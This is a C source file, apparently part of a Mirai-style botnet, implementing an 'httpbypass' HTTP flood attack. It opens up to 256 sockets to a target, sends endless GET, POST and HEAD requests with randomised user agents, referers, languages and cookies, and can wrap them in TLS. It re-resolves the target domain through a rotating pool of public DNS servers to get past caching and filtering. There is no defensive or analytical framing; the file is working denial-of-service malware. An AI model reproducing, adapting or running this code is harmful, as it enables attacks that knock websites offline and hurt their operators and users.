#define _GNU_SOURCE
#include <stdlib.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <string.h>
#include <time.h>
#include <sys/select.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <linux/if_ether.h>
#include <linux/tcp.h>
#include <linux/icmp.h>
#include <netinet/in.h>
#include <netdb.h>
#include <sys/time.h>

#include "includes.h"
#include "attack.h"
#include "checksum.h"
#include "rand.h"
#include "util.h"
#include "protocol.h"
#include "tls.h"
extern ipv4_t get_dns_resolver(void);
extern ipv4_t resolve_domain_with_server(char *domain, ipv4_t dns_server);
extern ipv4_t get_dns_resolver(void);


void attack_method_httpbypass(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i;
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 80);
    char *path = attack_get_opt_str(opts_len, opts, ATK_OPT_HTTP_PATH, "/");
    char *domain = attack_get_opt_str(opts_len, opts, ATK_OPT_DOMAIN, NULL);
    char host[256];
    ipv4_t target_ip = targs[0].addr;
    char target_ip_str[16];
    struct sockaddr_in addr;
    int sockets[256];
    int active = 0;
    time_t start = time(NULL);
    uint32_t method_sel = (uint32_t)attack_get_opt_int(opts_len, opts, ATK_OPT_HTTP_METHOD, 0xffff);
    int tls_enabled = attack_get_opt_int(opts_len, opts, ATK_OPT_TLS, 0);
    static const char *referers[] = {
        "http://www.google.com/search?q=",
        "http://www.bing.com/search?q=",
        "http://www.facebook.com/",
        "http://www.twitter.com/",
        "http://www.reddit.com/",
        "http://www.linkedin.com/",
        "http://www.instagram.com/",
        "http://www.youtube.com/",
        NULL
    };
    static const char *accept_langs[] = {
        "en-US,en;q=0.9",
        "en-GB,en;q=0.8",
        "fr-FR,fr;q=0.9,en;q=0.8",
        "de-DE,de;q=0.9,en;q=0.8",
        "ja-JP,ja;q=0.9,en;q=0.7",
        "es-ES,es;q=0.9,en;q=0.8",
        NULL
    };
    int dns_cycle = 0;
    int has_domain = domain && util_strlen(domain) > 0 && util_strlen(domain) < 255;

    /*
     * DNS resolver pool — re-resolve the domain via a different
     * server on every connection cycle to defeat caching.
     */
    ipv4_t dns_servers[12];
    dns_servers[0]  = INET_ADDR(8,8,8,8);
    dns_servers[1]  = INET_ADDR(8,8,4,4);
    dns_servers[2]  = INET_ADDR(1,1,1,1);
    dns_servers[3]  = INET_ADDR(9,9,9,9);
    dns_servers[4]  = INET_ADDR(208,67,222,222);
    dns_servers[5]  = INET_ADDR(208,67,220,220);
    dns_servers[6]  = INET_ADDR(64,6,64,6);
    dns_servers[7]  = INET_ADDR(74,82,42,42);
    dns_servers[8]  = INET_ADDR(77,88,8,8);
    dns_servers[9]  = INET_ADDR(4,2,2,2);
    dns_servers[10] = INET_ADDR(4,2,2,1);
    dns_servers[11] = INET_ADDR(4,2,2,3);
    const int ndns = 12;

    util_memcpy(target_ip_str, inet_ntoa(*(struct in_addr *)&target_ip), 16);
    target_ip_str[15] = 0;

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = target_ip;
    if (has_domain)
        util_strcpy(host, domain);
    else
        util_strcpy(host, target_ip_str);

    while (TRUE)
    {
        if (has_domain)
        {
            ipv4_t resolved = resolve_domain_with_server(domain, dns_servers[dns_cycle % ndns]);
            dns_cycle++;
            if (resolved != 0)
            {
                target_ip = resolved;
                addr.sin_addr.s_addr = resolved;
                util_memcpy(target_ip_str, inet_ntoa(*(struct in_addr *)&resolved), 16);
                target_ip_str[15] = 0;
            }
        }

        while (active < 256)
        {
            int s = socket(AF_INET, SOCK_STREAM, 0);
            if (s < 0) break;
            fcntl(s, F_SETFL, O_NONBLOCK | fcntl(s, F_GETFL, 0));
            addr.sin_port = htons(dport == 0xffff ? (rand_next() & 0xffff) : dport);
            connect(s, (struct sockaddr *)&addr, sizeof(addr));
            if (tls_enabled)
                tls_connect(s, host, 1);
            sockets[active++] = s;
        }
        for (i = 0; i < active; i++)
        {
            int s = sockets[i];
            char req[1536];
            int req_len;
            char method[8];
            int m = method_sel == 0xffff ? (rand_next() % 3) : (method_sel % 3);
            char cookie[64];
            static const char *uas[] = {
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) AppleWebKit/605.1.15 Mobile/15E148",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
            };

            if (m == 0) util_strcpy(method, "GET");
            else if (m == 1) util_strcpy(method, "POST");
            else util_strcpy(method, "HEAD");

            {
                int ci;
                for (ci = 0; ci < 8; ci++)
                {
                    cookie[ci * 2] = 'a' + (rand_next() % 26);
                    cookie[ci * 2 + 1] = '=';
                }
                cookie[16] = 0;
            }
            req_len = util_strcpy(req, method);
            req[req_len++] = ' ';
            req_len += util_strcpy(req + req_len, path);
            req_len += util_strcpy(req + req_len, " HTTP/1.1\r\nHost: ");
            req_len += util_strcpy(req + req_len, host);
            {
                char *ua = (char *)uas[rand_next() % 5];
                req_len += util_strcpy(req + req_len, "\r\nUser-Agent: ");
                req_len += util_strcpy(req + req_len, ua);
            }
            {
                char *lang = (char *)accept_langs[rand_next() % 5];
                req_len += util_strcpy(req + req_len, "\r\nAccept-Language: ");
                req_len += util_strcpy(req + req_len, lang);
            }
            {
                char *ref = (char *)referers[rand_next() % 5];
                req_len += util_strcpy(req + req_len, "\r\nReferer: ");
                req_len += util_strcpy(req + req_len, ref);
                req_len += util_strcpy(req + req_len, host);
                req_len += util_strcpy(req + req_len, "/");
            }
            req_len += util_strcpy(req + req_len, "\r\nCookie: ");
            req_len += util_strcpy(req + req_len, cookie);
            req_len += util_strcpy(req + req_len, "\r\nConnection: keep-alive\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: gzip, deflate, br\r\nCache-Control: no-cache\r\nPragma: no-cache\r\n\r\n");
            if (m == 1)
            {
                req_len += util_strcpy(req + req_len, "data=1&rand=");
                util_itoa(rand_next(), 16, req + req_len);
                req_len += util_strlen(req + req_len);
            }
            if (tls_enabled)
                tls_write(s, req, req_len);
            else
                send(s, req, req_len, MSG_NOSIGNAL);
        }
        {
            int j;
            for (j = 0; j < active; j++)
            {
                if (sockets[j] <= 0) continue;
                {
                    fd_set fds;
                    struct timeval tv = {0, 0};
                    FD_ZERO(&fds);
                    FD_SET(sockets[j], &fds);
                    if (select(sockets[j] + 1, &fds, NULL, NULL, &tv) > 0)
                    {
                        char buf[1024];
                        if (recv(sockets[j], buf, sizeof(buf), MSG_DONTWAIT) <= 0)
                        {
                            close(sockets[j]);
                            sockets[j] = sockets[--active];
                            sockets[active] = 0;
                            j--;
                        }
                    }
                }
            }
        }
        if (time(NULL) - start > attack_get_opt_int(opts_len, opts, ATK_OPT_TIME, 0xffff))
            break;
    }
    for (i = 0; i < active; i++)
        if (sockets[i] > 0) close(sockets[i]);
}

